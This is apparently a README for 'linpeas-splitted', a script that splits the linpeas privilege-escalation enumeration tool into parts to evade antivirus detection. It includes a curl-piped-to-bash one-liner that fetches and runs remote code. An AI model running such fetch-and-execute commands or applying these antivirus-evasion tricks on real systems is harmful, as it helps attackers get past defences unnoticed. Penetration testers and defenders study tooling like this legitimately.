# linpeas-splitted
Splits linpeas into multiple parts to evade AV

## Usage
One-liner:
```bash
curl -sSL https://raw.githubusercontent.com/ezekieltan/linpeas-splitted/refs/heads/main/linpeas-splitted.sh | bash
```
Or:
```bash
linpeas-splitted.sh "lp.sh" "random_string_here"
```
`lp.sh`: filename for the downloaded copy of linpeas<br>
`random_string_here`: A few instances of a random string will be inserted on top of every part. To specify the string explicitly, use this arguement.


To run linpeas:
```bash
cd ./lp_output
chmod +x ./part11.sh   # or whichever is the last part
./part11.sh
```
